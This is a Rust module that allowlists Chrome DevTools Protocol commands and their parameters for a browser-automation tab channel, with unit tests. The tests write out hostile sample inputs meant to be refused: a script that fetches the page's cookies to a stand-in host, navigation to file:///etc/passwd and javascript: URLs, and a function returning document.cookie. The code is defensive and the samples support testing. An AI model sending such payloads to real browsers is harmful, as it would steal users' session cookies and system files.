//! Which CDP commands a tab channel may carry.
//!
//! The same table is enforced by the runtime for both drivers and by the
//! extension on the user's Chrome (defense in depth: `chrome.debugger` also
//! exposes `Network` and `Storage`, i.e. the tab's cookies). Anything not
//! listed is refused before it reaches the browser.

use serde_json::Value;

use crate::scripts;

/// Every command the runtime sends to a tab, with the parameters it may carry.
/// A parameter not listed refuses the whole command: CDP keeps growing, and
/// some parameters are code (`Page.reload`'s `scriptToEvaluateOnLoad` runs a
/// script in every frame), so a method is only as safe as its parameters.
const ALLOWED: &[(&str, &[&str])] = &[
    ("Page.enable", &[]),
    ("Page.getFrameTree", &[]),
    ("Page.navigate", &["url"]),
    ("Page.getNavigationHistory", &[]),
    ("Page.navigateToHistoryEntry", &["entryId"]),
    ("Page.createIsolatedWorld", &["frameId", "worldName", "grantUniveralAccess"]),
    ("Page.handleJavaScriptDialog", &["accept", "promptText"]),
    ("Page.captureScreenshot", &["format", "quality"]),
    ("Runtime.enable", &[]),
    ("Runtime.callFunctionOn", &["functionDeclaration", "executionContextId", "arguments", "returnByValue", "awaitPromise"]),
    ("Input.dispatchMouseEvent", &["type", "x", "y", "button", "buttons", "clickCount", "deltaX", "deltaY", "modifiers"]),
    (
        "Input.dispatchKeyEvent",
        &["type", "key", "code", "windowsVirtualKeyCode", "nativeVirtualKeyCode", "text", "unmodifiedText", "modifiers", "commands"],
    ),
    ("Input.insertText", &["text"]),
    ("Emulation.setFocusEmulationEnabled", &["enabled"]),
    ("Emulation.setDeviceMetricsOverride", &["width", "height", "deviceScaleFactor", "mobile"]),
];

/// http(s) or about:blank — never `javascript:`, `file:`, `chrome:` or `data:`.
pub fn is_web_url(url: &str) -> bool {
    url == "about:blank" || url.starts_with("http://") || url.starts_with("https://")
}

/// `Ok(())` when `method` with `params` may be sent to a tab.
pub fn check(method: &str, params: &Value) -> Result<(), String> {
    let Some((_, keys)) = ALLOWED.iter().find(|(m, _)| *m == method) else {
        return Err(format!("{method} is not on the allowlist"));
    };
    if let Some(obj) = params.as_object() {
        if let Some(extra) = obj.keys().find(|k| !keys.contains(&k.as_str())) {
            return Err(format!("{method} may not carry `{extra}`"));
        }
    } else if !params.is_null() {
        return Err(format!("{method} takes an object of parameters"));
    }
    match method {
        "Runtime.callFunctionOn" => {
            if params.get("executionContextId").and_then(Value::as_i64).is_none() {
                return Err("Runtime.callFunctionOn needs an executionContextId".into());
            }
            let declaration = params.get("functionDeclaration").and_then(Value::as_str).unwrap_or("");
            if !scripts::is_allowed(declaration) {
                return Err("Runtime.callFunctionOn with a script that is not in the approved bundle".into());
            }
        }
        "Page.navigate" => {
            if !params.get("url").and_then(Value::as_str).is_some_and(is_web_url) {
                return Err("Page.navigate is allowed to http(s) and about:blank only".into());
            }
        }
        "Page.createIsolatedWorld" if params.get("grantUniveralAccess").and_then(Value::as_bool) == Some(true) => {
            return Err("Page.createIsolatedWorld without universal access only".into());
        }
        // `commands` runs editing commands; only "select all" (to replace a
        // field's text) is needed, never paste (the clipboard).
        "Input.dispatchKeyEvent"
            if params.get("commands").is_some_and(|c| c != &serde_json::json!(["selectAll"])) =>
        {
            return Err("Input.dispatchKeyEvent may only run the selectAll command".into());
        }
        _ => {}
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn cookies_storage_and_arbitrary_js_are_refused() {
        assert!(check("Network.getCookies", &json!({})).is_err());
        assert!(check("Storage.getCookies", &json!({})).is_err());
        assert!(check("Runtime.evaluate", &json!({"expression": "document.cookie"})).is_err());
        assert!(check("Page.addScriptToEvaluateOnNewDocument", &json!({"source": "1"})).is_err());
        assert!(check("DOM.setFileInputFiles", &json!({})).is_err());
    }

    #[test]
    fn only_approved_scripts_run_and_only_in_a_context() {
        let ok = json!({ "functionDeclaration": scripts::GUARD.declaration(), "executionContextId": 7 });
        assert!(check("Runtime.callFunctionOn", &ok).is_ok());
        let foreign = json!({ "functionDeclaration": "function () { return document.cookie; }", "executionContextId": 7 });
        assert!(check("Runtime.callFunctionOn", &foreign).is_err());
        let on_object = json!({ "functionDeclaration": scripts::GUARD.declaration(), "objectId": "1.2.3" });
        assert!(check("Runtime.callFunctionOn", &on_object).is_err());
    }

    #[test]
    fn input_and_page_basics_pass() {
        assert!(check("Input.dispatchMouseEvent", &json!({"type": "mousePressed"})).is_ok());
        assert!(check("Input.insertText", &json!({"text": "x"})).is_ok());
        assert!(check("Page.navigate", &json!({"url": "https://example.com"})).is_ok());
        assert!(check("Target.setAutoAttach", &json!({"flatten": false})).is_err());
    }

    #[test]
    fn parameters_that_carry_code_or_reach_further_are_refused() {
        // A reload that injects a script into every frame.
        assert!(check("Page.reload", &json!({"scriptToEvaluateOnLoad": "fetch('https://x.test/'+document.cookie)"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "https://example.com", "transitionType": "link", "referrer": "x"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "javascript:alert(1)"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "file:///etc/passwd"})).is_err());
        assert!(check("Input.dispatchKeyEvent", &json!({"type": "keyDown", "commands": ["paste"]})).is_err());
        assert!(check("Input.dispatchKeyEvent", &json!({"type": "keyDown", "key": "a", "commands": ["selectAll"]})).is_ok());
        assert!(check("Page.createIsolatedWorld", &json!({"frameId": "F", "grantUniveralAccess": true})).is_err());
        for unused in ["DOMSnapshot.captureSnapshot", "Accessibility.getFullAXTree", "Page.startScreencast", "DOM.resolveNode", "Target.setAutoAttach"] {
            assert!(check(unused, &json!({})).is_err(), "{unused}");
        }
    }
}
